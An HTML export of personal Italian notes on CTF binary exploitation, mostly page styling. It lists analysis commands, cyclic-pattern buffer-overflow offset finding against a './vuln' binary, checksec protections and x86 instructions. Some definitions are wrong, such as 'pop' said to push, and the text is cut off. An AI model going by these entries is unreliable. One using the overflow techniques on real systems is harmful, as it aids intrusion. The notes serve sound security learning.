@@ -1,0 +1,916 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>y</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-default_background {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-default_background {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="16145ec3-0d37-8110-8e26-d2e19d4f7810" class="page sans"><header><h1 class="page-title">y</h1><p class="page-description"></p></header><div class="page-body"><h1 id="16145ec3-0d37-8159-88c8-ea0fde458a0f" class="">Comandi utili</h1><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16145ec3-0d37-8196-accb-e4858ae667cd" class="code"><code class="language-C">strings                            /mostra funzioni
+file nome                          /mostra architettura (Ex:intel 80386)
+pwn cyclic 100 &gt; a                 /crea un pattern lungo 100 dentro al file a
+objdump -d file                    /mostra tutto il dump del codice
+ltrace -f file                     /mostra chiamate di sistema (con -f fa vedere anche i processi figli)
+strace -f file                     /alternativo al precedente con stesso scopo
+grep -r --text &#x27;picoCTF{.}&#x27;       /trovare testo ricorsivamente
+egrep -r --text &#x27;picoCTF{.?}      /alternativo al precedente con stesso scopo ma vede anche regex (espressioni regolari)
+readelf -s filebinario             /permette di vedere simboli e funzioni
+ldd &lt;filename&gt;                     /Librerie dinamiche caricate
+nm &lt;filename&gt;                      /Simboli caricati nel file
+cyclic &lt;number&gt;                    /Genera una sequenza di numeri per aiutare nei buffer overflow
+Es. cyclic 50 | ./vuln
+cyclic -l &lt;lookup_value&gt;           /Cerca la locazione di un valore nel pattern ciclico
+dmesg                              /Esamina o controlla il kernel ring buffer e visualizzare messaggi (utile per capire dove ci sono errori/segfault)</code></pre><p id="16145ec3-0d37-813f-ac4c-f4b1129cae9d" class="">Questi sono alcuni trucchi che ho sviluppato con la pratica</p><ul id="16145ec3-0d37-8123-97cc-ce920f1027ab" class="bulleted-list"><li style="list-style-type:disc">Se vedete numeri esadecimali assegnati a variabili in ghidra o altro, guardate sempre il loro valore ASCII.<br/>Potrebbe essere la bandiera o la password proprio davanti a voi.<br/></li></ul><ul id="16145ec3-0d37-81de-a7f1-efac4a2f3535" class="bulleted-list"><li style="list-style-type:disc">Comprendere il flusso del programma è più utile che capire ogni singola funzione</li></ul><ul id="16145ec3-0d37-81c7-a19a-f8f9777aba76" class="bulleted-list"><li style="list-style-type:disc">Se non c&#x27;è una funzione main, cercate la funzione di ingresso, di solito la prima funzione chiamata è __libc_start_main<br/>e il primo argomento di questa è di solito la funzione principale.<br/></li></ul><ul id="16145ec3-0d37-81df-830b-ec0139b139e4" class="bulleted-list"><li style="list-style-type:disc">Se il binario stampa un errore, dà un flag o qualcosa del genere, cercate la funzione responsabile,<br/>che molto probabilmente è la funzione main. Suggerisco di compilare da soli alcuni binari e di osservare come IDA/Ghidra genera lo pseudocodice. Questo sarà molto utile per capire.<br/></li></ul><p id="16145ec3-0d37-817a-8544-f4c50a36b396" class="">Checksec (controlla livello di sicurezza del file)<br/>&quot;checksec --file=./binario&quot; oppure &quot;checksec file&quot;<br/></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16145ec3-0d37-81c1-8ab1-e9d5a300bb28" class="code"><code class="language-C">pwn checksec nomefile             /simile al comando file ma da piu dettagli sull&#x27; eseguibile
+-Outputs di Checksec
+1- Architettura file
+2- RELRO                          /Relocation Read-Only (tecnica di mitigazione sui file binari)
+    - Partial RERO                /parte della GOT (Global Offset Table, caricamento dinamico indirizzi) è di sola lettura
+    - Full RERO                   /tutta la GOT è in sola lettura
+3- CANARY                         /Controllo sul return della funzione chiamata che si accerta che riporti alla funzione precedente.
+(Un canary è un valore scritto proprio prima della funzione; se si usa un BO, allora il canary sarà riscritto
+e l&#x27;overflow viene localizzato subito)
+4- NX                             /Non-Executable La stack non è eseguibile (non si può eseguire shellcode sullo stack)
+5- PIE                            /Position Independent Executable Indirizzi shiftati di uno stesso offset comune
+
+Si noti che, controllando la sicurezza del file con &quot;checksec&quot;,
+vi è la rilocazione degli indirizzi attivata (PIE Enabled).
+Questo significa che prima di eseguire il file ed eseguire &quot;disas&quot; comporta avere gli indirizzi con prefisso 0x0000,
+mentre mettere il break sul main, eseguire e poi fare &quot;disas&quot; comporta l&#x27;avere prefisso &quot;modificato&quot;.
+
+Vedi come funzionano gli eseguibili PIE, quello che vedi da ida e da gdb
+prima di dare run è l’offset rispetto la base di caricamento dell’eseguibile,
+quello che vedi da gdb dopo che hai dato run è l’indirizzo effettivo in memoria.
+
+6 - RUNPATH                       /(a volte presente) Path di esecuzione (se impostato per la stessa cartella di lavoro, è come &#x27;.&#x27;)
+</code></pre><p id="16145ec3-0d37-811a-beb3-dd9a9be30f1e" class="">
+</p><hr id="16145ec3-0d37-81c3-9cfd-c0b3e9d67b41"/><p id="16145ec3-0d37-816b-8475-db4715a4e509" class="">
+</p><p id="16145ec3-0d37-81de-9e1d-d263c0b6263a" class="">
+</p><p id="16145ec3-0d37-810b-aefe-efc9cadc1db5" class="">
+</p><p id="16145ec3-0d37-81c0-a42f-c540eca1d33a" class="">Per eseguibili a 32-bit per farli partire (Ubuntu):</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16145ec3-0d37-81f0-a252-f5cf8c80c20c" class="code"><code class="language-C">
+sudo dpkg --add-architecture i386
+sudo apt-get update
+sudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386</code></pre><p id="16145ec3-0d37-81d5-88e4-ded16867abde" class="">
+</p><p id="16145ec3-0d37-8143-9a83-d08d61e1a819" class="">Assembly<br/>Struttura -&gt; istruzione [sorgente-src] [destinazione-dst]<br/></p><p id="16145ec3-0d37-8160-9fa0-c268a6bc6759" class="">● “byte/b” refers to a one-byte integer -&gt; 8 bit<br/>● “word/w” refers to a two-byte integer -&gt; 16 bit<br/>● “doubleword/d” refers to a four-byte integer -&gt; 32 bit<br/>● “quadword/q” refers to an eight-byte value -&gt; 64 bit<br/>● s = single (32-bit floating point).<br/>● l = long (32 bit integer or 64-bit floating point).<br/>● t = ten bytes (80-bit floating point).<br/></p><p id="16145ec3-0d37-81cc-9bb2-dcf072fbdb88" class="">Quando le istruzioni hanno suffisso con una lettera come<br/>appena indicato, si riferisce a quella dimensione<br/></p><p id="16145ec3-0d37-8199-b85d-e4a1cda5d8e2" class="">Tutte le istruzioni: <a href="https://www.felixcloutier.com/x86/">https://www.felixcloutier.com/x86/</a></p><ul id="16145ec3-0d37-81db-96e4-f70ee95907c4" class="bulleted-list"><li style="list-style-type:disc">push<br/>Fa push di src nello stack<br/></li></ul><ul id="16145ec3-0d37-8146-bdf3-dd270d33b181" class="bulleted-list"><li style="list-style-type:disc">pop<br/>Fa push di pop nello stack<br/></li></ul><ul id="16145ec3-0d37-814a-8d9d-c8f7a6ffc514" class="bulleted-list"><li style="list-style-type:disc">mov<br/>Sposta un byte a word (con estensione di segno)<br/></li></ul><ul id="16145ec3-0d37-81f9-b413-e65f5ecf0e05" class="bulleted-list"><li style="list-style-type:disc">inc<br/>Incrementa di 1<br/></li></ul><ul id="16145ec3-0d37-813a-9c09-e383045eeada" class="bulleted-list"><li style="list-style-type:disc">dec<br/>Decrementa di 1<br/></li></ul><ul id="16145ec3-0d37-8100-8e61-f6b0f6828e3e" class="bulleted-list"><li style="list-style-type:disc">neg<br/>Negazione aritmetic<br/></li></ul><ul id="16145ec3-0d37-8153-95cb-c010862fc1f0" class="bulleted-list"><li style="list-style-type:disc">not<br/>Negazione logica<br/></li></ul><ul id="16145ec3-0d37-81fd-9437-fe681798a61f" class="bulleted-list"><li style="list-style-type:disc">lea -&gt; Load Effectiva Address (variante &quot;leaq&quot;, ma non dereferenzia)<br/>Carica l&#x27;indirizzo di &quot;src&quot; in &quot;dst&quot;<br/></li></ul><ul id="16145ec3-0d37-81d9-b8e3-c3a4233b7cec" class="bulleted-list"><li style="list-style-type:disc">add<br/>Aggiunge &quot;src&quot; a &quot;dst&quot;<br/></li></ul><ul id="16145ec3-0d37-81b1-a066-e3d5fa587eeb" class="bulleted-list"><li style="list-style-type:disc">sub<br/>Sottrae &quot;src&quot; a &quot;dst&quot;<br/></li></ul><ul id="16145ec3-0d37-818a-a2b9-d7cf61226e1e" class="bulleted-list"><li style="list-style-type:disc">xor/or/and<br/>Bitwise XOR/OR/AND di src e dst<br/></li></ul><ul id="16145ec3-0d37-817f-b9c4-d573737d3f8b" class="bulleted-list"><li style="list-style-type:disc">sal / shl -&gt; Shift Arithmetic Left - Logical Left Shift</li></ul><ul id="16145ec3-0d37-813d-838c-ccba1d9b5fd7" class="bulleted-list"><li style="list-style-type:disc">sar / shr -&gt; Shift Arithmetic Right - Logical Left Right<br/>imulq -&gt; Signed Multiply<br/>mulq -&gt; Unsigned Multiply<br/>idivq -&gt; Signed Division<br/>divq -&gt; Unsigned Division<br/></li></ul><ul id="16145ec3-0d37-81c3-91b4-d68aa7a26b60" class="bulleted-list"><li style="list-style-type:disc">movzbl -&gt; Move Zero-Extended Byte on Long<br/>Recupera il byte memorizzato come somma dei due parametri, aggiunge padding 0 e lo memorizza in un registro.<br/></li></ul><ul id="16145ec3-0d37-81dc-8dda-c324c0d43d8b" class="bulleted-list"><li style="list-style-type:disc">cmp<br/>Confronto aritmetico<br/></li></ul><ul id="16145ec3-0d37-81d4-ae0a-e906c9308d67" class="bulleted-list"><li style="list-style-type:disc">test<br/>Confronto logico<br/></li></ul><ul id="16145ec3-0d37-8143-a953-f34accb4efb3" class="bulleted-list"><li style="list-style-type:disc">jmp<br/>Salta all&#x27;etichetta/locazione specificata<br/></li></ul><ul id="16145ec3-0d37-81ef-a2e7-d16869725e9d" class="bulleted-list"><li style="list-style-type:disc">je -&gt; Jump if Equal</li></ul><ul id="16145ec3-0d37-81e2-b100-d3b4e7baae1f" class="bulleted-list"><li style="list-style-type:disc">jz -&gt; Jump if Zero</li></ul><ul id="16145ec3-0d37-81fd-a447-f1e09bcc3101" class="bulleted-list"><li style="list-style-type:disc">jne -&gt; Jump if not Equal</li></ul><ul id="16145ec3-0d37-81c3-87cb-e424c62bc42c" class="bulleted-list"><li style="list-style-type:disc">jnz -&gt; Jump if not Zero</li></ul><ul id="16145ec3-0d37-8135-b41c-c7153b51b48c" class="bulleted-list"><li style="list-style-type:disc">js -&gt; Jump if negatuve</li></ul><ul id="16145ec3-0d37-8182-a494-ee5899a73176" class="bulleted-list"><li style="list-style-type:disc">jns -&gt; Jump in notnegative</li></ul><ul id="16145ec3-0d37-81d9-9757-fc83f3ff89fb" class="bulleted-list"><li style="list-style-type:disc">jg -&gt; Jump if greater</li></ul><ul 